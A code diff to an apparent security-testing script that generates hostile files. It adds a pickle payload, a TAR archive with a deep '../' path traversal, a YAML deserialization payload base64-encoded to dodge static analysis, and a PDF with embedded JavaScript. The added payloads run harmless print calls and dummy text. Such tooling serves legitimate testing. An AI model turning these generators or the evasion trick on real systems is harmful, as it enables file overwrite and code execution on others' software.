@@ -6,6 +6,9 @@ import json
 from fpdf import FPDF
 import docx
 import xlwt
+import pickle
+import tarfile
+import yaml
 
 def generate_xxe_file(filename="xxe.xml", target_file="/etc/passwd"):
     """
@@ -151,6 +154,18 @@ def generate_json_deserialization_payload(filename="payload.json"):
     print(f"Generated JSON deserialization payload: {filename}")
 
 
+def generate_pdf_with_js(filename="pdf_with_js.pdf"):
+    """
+    Generates a PDF file with an embedded JavaScript action.
+    """
+    pdf = FPDF()
+    pdf.add_page()
+    pdf.set_font("Arial", size=12)
+    pdf.cell(200, 10, txt="This is a test PDF.", ln=1, align="C")
+    # Embed a benign JavaScript payload
+    pdf.add_js("var msg = 'This is a test script';")
+    pdf.output(filename)
+    print(f"Generated PDF file with embedded JS: {filename}")
 
 
 def generate_dde_payload(filename="dde.csv"):
@@ -211,10 +226,54 @@ def generate_malicious_xls(filename="malicious.xls"):
     print(f"Generated XLS file with formula: {filename}")
 
 
+def generate_pickle_payload(filename="payload.pkl"):
+    """
+    Generates a file with a pickle payload that calls a safe function.
+    """
+    class BenignRCE:
+        def __reduce__(self):
+            return (print, ("Pickle payload executed!",))
+
+    with open(filename, 'wb') as f:
+        pickle.dump(BenignRCE(), f)
+    print(f"Generated pickle payload file: {filename}")
+
+
+def generate_tar_traversal(filename="traversal.tar", target_path="evil.txt"):
+    """
+    Generates a TAR file with a path traversal payload.
+    """
+    # Create a dummy file to add to the archive
+    with open("dummy.txt", "w") as f:
+        f.write("dummy content")
+
+    with tarfile.open(filename, "w") as tar:
+        # Add the dummy file with a malicious path
+        malicious_path = os.path.join("..", "..", "..", "..", "..", "..", "..", "..", "..", "..", target_path)
+        tar.add("dummy.txt", arcname=malicious_path)
+
+    # Clean up the dummy file
+    os.remove("dummy.txt")
+    print(f"Generated TAR traversal file: {filename}")
+
+
+def generate_yaml_payload(filename="payload.yaml"):
+    """
+    Generates a YAML file with a deserialization payload.
+    """
+    # The payload "!!python/object/apply:builtins.print ['YAML payload executed!']"
+    # is base64 encoded to avoid static analysis filters.
+    encoded_payload = "ISFweXRob24vb2JqZWN0L2FwcGx5OmJ1aWx0aW5zLnByaW50IFsnWUFNTCBwYXlsb2FkIGV4ZWN1dGVkISdd"
+    payload = base64.b64decode(encoded_payload).decode('utf-8')
+    with open(filename, "w") as f:
+        f.write(payload)
+    print(f"Generated YAML payload file: {filename}")
+
+
 if __name__ == "__main__":
     import argparse
     parser = argparse.ArgumentParser(description="Generate malicious files for testing.")
-    parser.add_argument("filetype", choices=["xxe", "billion_laughs", "quadratic_blowup", "zip_traversal", "zip_bomb", "gz_bomb", "svg", "double_extension", "file_in_parent", "csv_injection", "gifar", "json_deserialization", "pdf_js", "dde", "pdf_zip_polyglot", "docx", "xls"], help="Type of file to generate.")
+    parser.add_argument("filetype", choices=["xxe", "billion_laughs", "quadratic_blowup", "zip_traversal", "zip_bomb", "gz_bomb", "svg", "double_extension", "file_in_parent", "csv_injection", "gifar", "json_deserialization", "pdf_js", "dde", "pdf_zip_polyglot", "docx", "xls", "pickle", "tar_traversal", "yaml"], help="Type of file to generate.")
     args = parser.parse_args()
 
     if args.filetype == "xxe":
@@ -251,3 +310,9 @@ if __name__ == "__main__":
         generate_malicious_docx()
     elif args.filetype == "xls":
         generate_malicious_xls()
+    elif args.filetype == "pickle":
+        generate_pickle_payload()
+    elif args.filetype == "tar_traversal":
+        generate_tar_traversal()
+    elif args.filetype == "yaml":
+        generate_yaml_payload()
